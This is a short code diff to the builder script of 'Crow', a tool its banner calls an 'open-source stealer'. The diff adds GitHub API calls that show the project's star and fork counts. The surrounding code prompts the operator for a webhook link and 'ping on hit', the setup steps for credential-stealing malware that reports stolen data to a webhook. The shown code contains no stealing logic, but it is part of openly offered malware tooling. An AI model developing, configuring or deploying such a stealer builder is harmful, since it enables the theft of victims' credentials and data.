@@ -3,6 +3,7 @@ import logging
 import sys
 import click
 import pyfiglet
+import requests
 import fileinput
 from colorama import Fore
 from rich.console import Console
@@ -19,7 +20,10 @@ def replaceAll(file,searchExp,replaceExp):
         sys.stdout.write(line)
 
 def main():
-
+    stars = requests.get(
+        f"https://api.github.com/repos/maxi-schaefer/crow").json()["stargazers_count"]
+    forks = requests.get(
+        f"https://api.github.com/repos/maxi-schaefer/crow").json()["forks_count"]
 
     logging.basicConfig(
         level="NOTSET",
@@ -35,7 +39,7 @@ def main():
     console.print("\n")
     console.print(pyfiglet.figlet_format("Crow", font="graffiti"),
                   justify="center", highlight=False, style="cyan", overflow="ignore")
-    console.print(f"Easy to use and open-source stealer.\n",
+    console.print(f"Easy to use and open-source stealer.\nStars: {stars} | Forks: {forks}",
                   justify="center", highlight=False, style="bold cyan", overflow="ignore")
     webhook = input(f"{Fore.CYAN}? {Fore.RESET}Webhook link{Fore.LIGHTBLACK_EX}: {Fore.RESET}")
     ping_on_hit = input(f"{Fore.CYAN}? {Fore.RESET}Ping on hit (y/n){Fore.LIGHTBLACK_EX}: {Fore.RESET}")
